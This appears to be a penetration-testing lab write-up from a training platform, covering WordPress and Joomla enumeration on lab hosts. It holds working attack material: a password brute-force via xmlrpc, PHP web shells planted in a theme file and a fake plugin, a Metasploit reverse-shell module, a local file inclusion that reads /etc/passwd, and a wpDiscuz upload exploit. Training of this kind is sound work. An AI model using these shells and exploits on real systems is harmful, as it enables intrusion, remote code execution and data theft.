 |     References:
 |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
 |     
 | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
 |      
 | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
 |      
 | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
 |      
 | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
 |     
 | [!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |     
 | [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files
 |     Fixed in: 5.8.7
 |     References:
 |      - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6
 |     
 | [!] Title: WP < 6.2.1 - Thumbnail Image Update via CSRF
 |     Fixed in: 5.8.7
 |     References:
 |      - https://wpscan.com/vulnerability/a03d744a-9839-4167-a356-3e7da0f1d532
 |     
 | [!] Title: WP < 6.2.1 - Contributor+ Stored XSS via Open Embed Auto Discovery
 |     Fixed in: 5.8.7
 |     References:
 |      - https://wpscan.com/vulnerability/3b574451-2852-4789-bc19-d5cc39948db5
 |     
 | [!] Title: WP < 6.2.2 - Shortcode Execution in User Generated Data
 |     Fixed in: 5.8.7
 |     References:
 |      - https://wpscan.com/vulnerability/ef289d46-ea83-4fa5-b003-0352c690fd89
 |      
 | [!] Title: WP < 6.2.1 - Contributor+ Content Injection
 |     Fixed in: 5.8.7
 |     References:
 |      - https://wpscan.com/vulnerability/1527ebdb-18bc-4f9d-9c20-8d729a628670
 |    
 | [!] Title: WP 5.6-6.3.1 - Reflected XSS via Application Password Requests
 |     Fixed in: 5.8.8
 |     References:
 |      - https://wpscan.com/vulnerability/da1419cc-d821-42d6-b648-bdb3c70d91f2
 |     
 | [!] Title: WP < 6.3.2 - Denial of Service via Cache Poisoning
 |     Fixed in: 5.8.8
 |     References:
 |      - https://wpscan.com/vulnerability/6d80e09d-34d5-4fda-81cb-e703d0e56e4f
 |    
 | [!] Title: WP < 6.3.2 - Subscriber+ Arbitrary Shortcode Execution
 |     Fixed in: 5.8.8
 |     References:
 |      - https://wpscan.com/vulnerability/3615aea0-90aa-4f9a-9792-078a90af7f59
 |      
 | [!] Title: WP < 6.3.2 - Contributor+ Comment Disclosure
 |     Fixed in: 5.8.8
 |     References:
 |      - https://wpscan.com/vulnerability/d35b2a3d-9b41-4b4f-8e87-1b8ccb370b9f
 |     
 | [!] Title: WP < 6.3.2 - Unauthenticated Post Author Email Disclosure
 |     Fixed in: 5.8.8
 |     References:
 |      - https://wpscan.com/vulnerability/19380917-4c27-4095-abf1-eba6f913b441
 |     
 | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
 |     Fixed in: 5.8.9
 |     References:
 |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |     
 | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
 |     Fixed in: 5.8.9
 |     References:
 |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |    
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 5.8.10
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |    
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 5.8.10
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |     
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 5.8.10
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |    
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 5.8.12
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |     
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 5.8.12
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |     
[+] WordPress theme in use: transport-gravity
 | Location: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/
 | Latest Version: 1.0.1 (up to date)
 | Last Updated: 2020-08-02T00:00:00.000Z
 | Readme: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css
 | Style Name: Transport Gravity
 | Style URI: https://keonthemes.com/downloads/transport-gravity/
 | Description: Transport Gravity is an enhanced child theme of Business Gravity. Transport Gravity is made for tran...
 | Author: Keon Themes
 | Author URI: https://keonthemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css, Match: 'Version: 1.0.1'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] contact-form-7
 | Location: http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/
 | Last Updated: 2026-02-08T09:32:00.000Z
 | [!] The version is out of date, the latest version is 6.1.5
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 4 vulnerabilities identified:
 |
 | [!] Title: Contact Form 7 < 5.8.4 - Authenticated (Editor+) Arbitrary File Upload
 |     Fixed in: 5.8.4
 |     References:
 |      - https://wpscan.com/vulnerability/70e21d9a-b1e6-4083-bcd3-7c1c13fd5382
 |      
 | [!] Title: Contact Form 7 < 5.9.2 - Reflected Cross-Site Scripting
 |     Fixed in: 5.9.2
 |     References:
 |      - https://wpscan.com/vulnerability/1c070a2c-2ab0-43bf-b10b-6575709918bc
 |     
 | [!] Title:  Contact Form 7 < 5.9.5 - Unauthenticated Open Redirect
 |     Fixed in: 5.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/8bdcdb5a-9026-4157-8592-345df8fb1a17
 |     
 | [!] Title: Contact Form 7 < 6.0.6 - Order Replay Vulnerability
 |     Fixed in: 6.0.6
 |     References:
 |      - https://wpscan.com/vulnerability/7dbafbe2-abbc-4191-a587-afa89c2f7421
 |      
 | Version: 5.4.2 (90% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2
 | Confirmed By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/readme.txt

[+] mail-masta
 | Location: http://blog.inlanefreight.local/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Mail Masta <= 1.0 - Unauthenticated Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/5136d5cf-43c7-4d09-bf14-75ff8b77bb44
 |     
 | [!] Title: Mail Masta 1.0 - Multiple SQL Injection
 |     References:
 |      - https://wpscan.com/vulnerability/c992d921-4f5a-403a-9482-3131c69e383a
 |      
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:21 <========================> (652 / 652) 100.00% Time: 00:00:21
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:01:31 <======================> (2575 / 2575) 100.00% Time: 00:01:31

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:05 <=========================> (137 / 137) 100.00% Time: 00:00:05

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:02 <===============================> (84 / 84) 100.00% Time: 00:00:02

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:05 <====================> (100 / 100) 100.00% Time: 00:00:05

[i] Medias(s) Identified:

[+] http://blog.inlanefreight.local/?attachment_id=5
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://blog.inlanefreight.local/?attachment_id=6
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://blog.inlanefreight.local/?attachment_id=13
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://blog.inlanefreight.local/?attachment_id=18
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://blog.inlanefreight.local/?attachment_id=22
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==========================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] by:
                                                                        admin
 | Found By: Author Posts - Display Name (Passive Detection)

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] doug
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 5
 | Requests Remaining: 20

[+] Finished: Thu Apr  2 12:29:09 2026
[+] Requests Done: 3616
[+] Cached Requests: 12
[+] Data Sent: 1.045 MB
[+] Data Received: 1.183 MB
[+] Memory used: 280.758 MB
[+] Elapsed time: 00:02:23

```

This scan helped us confirm some of the things we uncovered from manual enumeration (WordPress core version 5.8 and directory listing enabled), showed us that the theme that we identified was not exactly correct (Transport Gravity is in use which is a child theme of Business Gravity), uncovered another username (john), and showed that automated enumeration on its own is often not enough (missed the wpDiscuz and Contact Form 7 plugins). WPScan provides information about known vulnerabilities. The report output also contains URLs to PoCs, which would allow us to exploit these vulnerabilities.

### Moving on

From the data we gathered manually and using WPScan, we now know the following:

- The site is running WordPress core version 5.8, which does suffer from some vulnerabilities that do not seem interesting at this point
- The installed theme is Transport Gravity
- The following plugins are in use: Contact Form 7, mail-masta, wpDiscuz
- The wpDiscuz version is 7.0.4, which suffers from an unauthenticated remote code execution vulnerability
- The mail-masta version is 1.0.0, which suffers from a Local File Inclusion vulnerability as well as SQL injection
- The WP Sitemap page 1.6.4 suffers from **a Stored Cross-Site Scripting vulnerability**
- The WordPress site is vulnerable to user enumeration, and the users `admin` and `doug` are confirmed to be valid users
- Directory listing is enabled throughout the site, which may lead to sensitive data exposure
- XML-RPC is enabled, which can be leveraged to perform a password brute-forcing attack against the login page using WPScan, [Metasploit](https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login), etc.

With this information noted down, let's move on to the fun stuff: attacking WordPress!

### Challenge

1. **Enumerate the host and find a flag.txt flag in an accessible directory.**

based on the wpscan result, it discovered the upload directory and i found the flag here:

```bash
http://blog.inlanefreight.local/wp-content/uploads/2021/08/
```

1. **Perform manual enumeration to discover another installed plugin. Submit the plugin name as the answer (3 words).**

I checked the source code of the recent comment and found this plugin: 

```bash
$ curl -s "http://blog.inlanefreight.local/?p=1" | grep "plugins"

<p><a href="http://wordpress.org/plugins/wp-sitemap-page/">Powered by "WP Sitemap Page"</a></p></div></strong></p>
```

1. **Find the version number of this plugin. (i.e., 4.5.2)**

Same as we found mali mista plugin readme.txt file, I was able to view the readme.txt file by specifying the plugin name 

```bash
http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt
```

and this is the readme.txt file, it contains the version of theplugin which is `1.6.4`

```bash
== WP Sitemap Page ===
Contributors: funnycat
Donate link: http://www.infowebmaster.fr/dons.php
Tags: sitemap, generator, page list, site map, html sitemap, sitemap generator, dynamic sitemap, seo
Requires at least: 3.0
Tested up to: 5.6.2
Stable tag: 1.6.4
License: GPLv2 or later
```

After searching for vulnerabilities under this version, I found that it is vulnerable to cross-site scripting. Source:

- https://www.exploit-db.com/exploits/50268

## **Attacking WordPress**

There are several ways we can abuse `built-in functionality` to attack a WordPress installation. We will cover login brute forcing against the `wp-login.php` page and remote code execution via the theme editor. These two tactics build on each other as we need first to obtain valid credentials for an administrator-level user to log in to the WordPress back-end and edit a 
theme.

### Login Brute-Force

WPScan can be used to brute force usernames and passwords. The scan report in the previous section returned two users registered on the website (admin and doug). The tool uses two kinds of login brute force attacks, [xmlrpc](https://kinsta.com/blog/xmlrpc-php/) and wp-login. The `wp-login` method will attempt to brute force the standard WordPress login page, while the `xmlrpc` method uses WordPress API to make login attempts through `/xmlrpc.php`. The `xmlrpc` method is preferred as it’s faster.

```bash
$ sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local/
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - doug / jessica1                                                              
Trying doug / blessed Time: 00:00:56 <           > (660 / 14345052)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: doug, Password: jessica1

```

Valid credentials: `doug: jessica1`

### Code Execution

With administrative access to WordPress, we can modify the PHP source code to execute system commands. After login with the credentials found, from the `Appearance` tab, click on `Theme Editors`

![Screenshot_2026-04-03_10_13_39.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/6916cdea-855b-4119-bb80-831a52a1257d.png)

This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme. We already know that the active theme is Transport Gravity. An alternate theme such as Twenty Nineteen can be chosen instead.

Click on `Select` after selecting the theme, and we can edit an uncommon page such as `404.php` to add a web shell.

```php
system($_GET[0]);
```

The code above should let us execute commands via the GET parameter `0`. We add this single line to the file just below the comments to avoid too much modification of the contents.

![Screenshot_2026-04-03_11_36_52.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/7a018b10-4f2d-4fb3-bdf7-c601ca868893.png)

Click on `Update File` at the bottom to save. We know that WordPress themes are located at `/wp-content/themes/<theme name>`

```bash
─$ curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module from Metasploit can be used to upload a shell and execute it automatically.

The module uploads a malicious plugin and then uses it to execute a PHP Meterpreter shell. We first need to set the necessary options.

```bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show info 

       Name: WordPress Admin Shell Upload
     Module: exploit/unix/webapp/wp_admin_shell_upload
   Platform: PHP
       Arch: php
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2015-02-21

Provided by:
  rastating

Available targets:
      Id  Name
      --  ----
  =>  0   WordPress

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  PASSWORD                    yes       The WordPress password to authenticate with
  Proxies                     no        A proxy chain of format type:host:port[,type:host:p
                                        ort][...]. Supported proxies: sapni, socks4, socks5
                                        , socks5h, http
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com
                                        /docs/using-metasploit/basics/using-metasploit.html
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The base path to the wordpress application
  USERNAME                    yes       The WordPress username to authenticate with
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module will generate a plugin, pack the payload into it
  and upload it to a server running WordPress provided valid
  admin credentials are used.

```

set the required option and the VHOST of the target also set the LHOST (local host ) to your HTB VPN IP address

```bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME doug
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD jessica1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 10.129.21.177
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options 

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting           Required  Description
   ----       ---------------           --------  -----------
   PASSWORD   jessica1                  yes       The WordPress password to authenticate wi
                                                  th
   Proxies                              no        A proxy chain of format type:host:port[,t
                                                  ype:host:port][...]. Supported proxies: s
                                                  apni, socks4, socks5, socks5h, http
   RHOSTS     10.129.21.177             yes       The target host(s), see https://docs.meta
                                                  sploit.com/docs/using-metasploit/basics/u
                                                  sing-metasploit.html
   RPORT      80                        yes       The target port (TCP)
   SSL        false                     no        Negotiate SSL/TLS for outgoing connection
                                                  s
   TARGETURI  /                         yes       The base path to the wordpress applicatio
                                                  n
   USERNAME   doug                      yes       The WordPress username to authenticate wi
                                                  th
   VHOST      blog.inlanefreight.local  no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

Now we can type `exploit` and obtain a reverse shell. From here, we could start enumerating the 
host for sensitive data or paths for vertical/horizontal privilege escalation and lateral movement.

The exploitation from Metasploit didn't work for me, so I tested it manually. I first uploaded the PHP file to the uploads section in the **Plugins** tab

![Screenshot_2026-04-03_13_53_55.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/8f4a088e-8ae9-42e2-bf39-ec3aa04fb3e9.png)

But that didnt work because it requires a zip file format. So I added this simple PHP web shell into the test.zip file

```php
system($_GET['cmd']);?>
```

Also, that didn't work. Lastly, I added the plugin header along with the web shell 

```php
<?php
/**
 * Plugin Name: Web_Shell
 * Version: 8.5.1
 * Author: test
 * Author URI: https://github.com/test
 * License: GPL2
 */
system($_GET['cmd']);?>
```

and uploaded the test.zip that contains this PHP file, and it worked!. 

![Screenshot_2026-04-03_13_26_59.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/3e7a448f-0640-4cd8-a5d2-a60bb518b3bb.png)

The last step is to activate the plugin and navigate to the plugin directory to achieve remote code execution

```bash
$ curl "http://blog.inlanefreight.local/wp-content/plugins/test/web_shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### **Vulnerable Plugins - mail-masta**

 The plugin [mail-masta](https://wordpress.org/plugins/mail-masta/) is no longer supported and since 2016, it has suffered an [unauthenticated SQL injection](https://www.exploit-db.com/exploits/41438) and a [Local File Inclusion](https://www.exploit-db.com/exploits/50226).

If you look at the source code, you will see it uses `include` function to include local files without any type of input validation or sanitization.

![Screenshot_2026-04-03_14_03_12.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/ccf78a32-6246-4301-8be4-34cf5bb41f9f.png)

Using this, we can include arbitrary files on the web server. Let's exploit this to retrieve the contents of the `/etc/passwd` file using `cURL`

```bash
─$ curl "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd" 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologi..
...
webadmin:x:1001:1001::/home/webadmin:/bin/bash
mrb3n:x:1002:1002::/home/mrb3n:/bin/sh
```

### **Vulnerable Plugins - wpDiscuz**

[wpDiscuz](https://wpdiscuz.com/) is a WordPress plugin for enhanced commenting on page posts. The crux of the vulnerability is a file upload bypass. wpDiscuz is intended only to allow image attachments. 

![Screenshot_2026-04-03_21_44_50.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/81a9518a-6425-4dda-8ec3-91365bbae05c.png)

The file mime type functions could be bypassed, allowing an unauthenticated attacker to upload a malicious PHP file and gain remote code execution. We will use this [exploit](https://www.exploit-db.com/exploits/49967), it takes two parameters: `-u` the URL and `-p` the path to a valid post.

```bash
$ python3 49967.py  -u http://blog.inlanefreight.local -p "/?p=1"
---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[105764] | code:[200]
[!] Got wmuSecurity value: fac6962be2
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: hxpdnlqixmsczxw

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2026/04/hxpdnlqixmsczxw-1775242118.9501.php&quot; 

> id

[x] Failed to execute PHP code...
                           
                           
$ curl "http://blog.inlanefreight.local/wp-content/uploads/2026/04/hxpdnlqixmsczxw-1775242118.9501.php?cmd=id"
GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
                            
```

In this example, we would want to make sure to clean up the `hxpdnlqixmsczxw-1775242118.9501.php` file and once again list it as a testing artifact in the appendices of our report.

### Moving on

As we have seen from the last two sections, WordPress presents a vast attack surface. During our careers as penetration testers, we will almost definitely encounter WordPress many times. We must have the skills to quickly footprint a WordPress installation and perform thorough manual and tool-based enumeration to uncover high-risk misconfigurations and vulnerabilities.

## **Joomla - Discovery & Enumeration**

[Joomla](https://www.joomla.org/), released in August 2005 is another free and open-source CMS used for discussion forums, photo galleries, e-Commerce, user-based communities, and more. It is written in PHP and uses MySQL in the backend. 

### **Discovery/Footprinting**

Browse the target and check what is running. 

![Screenshot_2026-04-03_22_03_06.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/36b4fc1c-8a56-4561-8312-7aadd0468e6f.png)

we can also use curl to confirm the target CMS

```bash
─$ curl http://app.inlanefreight.local/ -s | grep "Joomla"
        <meta name="generator" content="Joomla! - Open Source Content Management" />
```

The `robots.txt` file for a Joomla site will often look like this:

```bash
$ curl http://app.inlanefreight.local/robots.txt         
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

We can also often see the telltale Joomla favicon (but not always). We can fingerprint the Joomla version if the `README.txt` file is present.

```bash
 curl http://app.inlanefreight.local/README.txt
1- What is this?
        * This is a Joomla! installation/upgrade package to version 3.x
        * Joomla! Official site: https://www.joomla.org
        * Joomla! 3.10 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.10_version_history
        * Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/3.10-dev
```

In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml`.

```bash
$ curl http://app.inlanefreight.local/administrator/manifests/files/joomla.xml -s | xmllint --format -
<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
  <name>files_joomla</name>
  <author>Joomla! Project</author>
  <authorEmail>admin@joomla.org</authorEmail>
  <authorUrl>www.joomla.org</authorUrl>
  <copyright>(C) 2019 Open Source Matters, Inc.</copyright>
  <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
  <version>3.10.0</version>
  <creationDate>August 2021</creationDate>
  <description>FILES_JOOMLA_XML_DESCRIPTION</description>
  <scriptfile>administrator/components/com_admin/script.php</scriptfile>
  <update>
```

The `cache.xml` file can help to give us the approximate version. It is located at `plugins/system/cache/cache.xml`.

### Enumeration

Let's try out [droopescan](https://github.com/droope/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.

```bash
$ sudo pip3 install droopescan
```

```bash
$ droopescan scan joomla --url http://app.inlanefreight.local/
[+] Possible version(s):                                                        
    3.10.0-alpha1

[+] Possible interesting urls found:
    Detailed version information. - http://app.inlanefreight.local/administrator/manifests/files/joomla.xml                                                                                             
    Login page. - http://app.inlanefreight.local/administrator/
    License file. - http://app.inlanefreight.local/LICENSE.txt
    Version attribute contains approx version - http://app.inlanefreight.local/plugins/system/cache/cache.xml                                                                                           

[+] Scan finished (0:00:01.963078 elapsed)
```

We can use [JoomScan](https://github.com/drego85/JoomlaScan) tool to extract more information but this tool is out-of-date so I updated the code to python3 → [JoomScan updated](https://github.com/aisha-x/JoomlaScan.git)

- Note: Don’t add slash `/` at the end of the target url

```bash
$ python3 joomlascan.py -u http://dev.inlanefreight.local 
-------------------------------------------
                Joomla Scan                  
    Usage: python3 joomlascan.py -u <target> 
     Version 0.5beta-py3 - Database Entries 1235
           created by Andrea Draghetti       
-------------------------------------------
Robots file found:               > http://dev.inlanefreight.local/robots.txt
No Error Log found

Start scan...with 10 concurrent threads!
Component found: com_actionlogs  > http://dev.inlanefreight.local/index.php?option=com_actionlogs
         On the administrator components
Component found: com_admin       > http://dev.inlanefreight.local/index.php?option=com_admin
         On the administrator components
Component found: com_ajax        > http://dev.inlanefreight.local/index.php?option=com_ajax
         But possibly it is not active or protected
         LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_actionlogs/actionlogs.xml
         LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_admin/admin.xml
         LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_ajax/ajax.xml
         Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_actionlogs/
         Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_admin/
Component found: com_banners     > http://dev.inlanefreight.local/index.php?option=com_banners
         But possibly it is not active or protected
         Explorable Directory    > http://dev.inlanefreight.local/components/com_ajax/
         Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_ajax/
         LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_banners/banners.xml
         Explorable Directory    > http://dev.inlanefreight.local/components/com_banners/
         Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_banners/
Component found: com_config      > http://dev.inlanefreight.local/index.php?option=com_config
Component found: com_contact     > http://dev.inlanefreight.local/index.php?option=com_contact
Component found: com_content     > http://dev.inlanefreight.local/index.php?option=com_content
Component found: com_contenthistory      > http://dev.inlanefreight.local/index.php?option=com_contenthistory
         But possibly it is not active or protected
         LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_config/config.xml
         LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_contact/contact.xml
         LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_content/content.xml
         LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_contenthistory/contenthistory.xml
         Explorable Directory    > http://dev.inlanefreight.local/components/com_contact/
         Explorable Directory    > http://dev.inlanefreight.local/components/com_config/
         Explorable Directory    > http://dev.inlanefreight.local/components/com_content/
         Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_contact/
         Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_config/
         Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_content/
         Explorable Directory    > http://dev.inlanefreight.local/components/com_contenthistory/
         Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_contenthistory/
Component found: com_fields      > http://dev.inlanefreight.local/index.php?option=com_fields
         But possibly it is not active or protected
         LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_fields/fields.xml
         Explorable Directory    > http://dev.inlanefreight.local/components/com_fields/
         Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_fields/
Component found: com_installer   > http://dev.inlanefreight.local/index.php?option=com_installer
         On the administrator components
         LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_installer/installer.xml
         Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_installer/
Component found: com_joomlaupdate        > http://dev.inlanefreight.local/index.php?option=com_joomlaupdate
         On the administrator components
         LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_joomlaupdate/joomlaupdate.xml
         Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_joomlaupdate/
Component found: com_mailto      > http://dev.inlanefreight.local/index.php?option=com_mailto
         But possibly it is not active or protected
Component found: com_media       > http://dev.inlanefreight.local/index.php?option=com_media
         But possibly it is not active or protected
